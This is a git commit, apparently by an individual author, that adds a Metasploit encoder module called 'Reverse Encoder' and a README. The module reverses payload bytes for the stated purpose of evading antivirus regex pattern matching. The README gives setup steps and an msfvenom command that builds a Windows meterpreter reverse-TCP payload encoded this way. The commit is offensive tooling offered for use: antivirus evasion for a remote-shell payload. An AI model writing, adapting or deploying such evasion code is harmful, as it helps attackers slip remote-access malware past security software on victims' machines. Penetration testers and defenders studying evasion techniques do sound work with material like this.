1e5e71bfd1663133358b892a8ad857c8b10e8439
Klaus Mueller <klaumueller1969@gmail.com>
2022-06-07 07:53:28 +0200

    Add reverse.rb

--- README.md
+++ README.md
@@ -1,2 +1,23 @@
 # Metasploit_ReverseEncoder
 Generic Metasploit Encoder that simply reverses the payload to avoid AV RegEx Pattern Matching 
+
+## Setup
+Place the reverse.rb file inside "/usr/share/metasploit-framework/modules/encoders/generic" folder.
+
+## Sample Usage
+
+Try this to verify that Metasploit finds the encoder:
+	msfvenom --list encoders
+
+The resulting output should contain the following line
+
+	generic/reverse              normal     Reverse Encoder
+
+
+Now encode your payload with -e generic/reverse, eg;
+
+	msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=wlan0 LPORT=4444 -e generic/reverse -f c -o reversePayload.h
+
+## Limitations:
+
+This encoder only works with Framework Transform Formats (see msfvenom --list formats) and you need to provde your own decode as part of the payload executable creatiion
---
+++ reverse.rb
@@ -0,0 +1,29 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+
+class MetasploitModule < Msf::Encoder
+
+## TODO: Limit file format to Framework Transform Formats
+
+  def initialize
+    super(
+      'Name'             => 'Reverse Encoder',
+      'Description'      => %q{
+        This encoder reverses the payload. Do not provide a decoder_block_size as reversing needs to be done on complete payload. Does only work with non executable formats as payload needs to be reverted before execution. 
+      },
+      'Author'           => 'Klaus Mueller',
+      'License'          => MSF_LICENSE,
+      'Arch'             => ARCH_ALL,
+      'EncoderType'      => Msf::Encoder::Type::Raw)
+  end
+
+  #
+  # Simply return the reversed buf.
+  #
+  def encode_block(state, buf)
+    buf.reverse()
+  end
+end
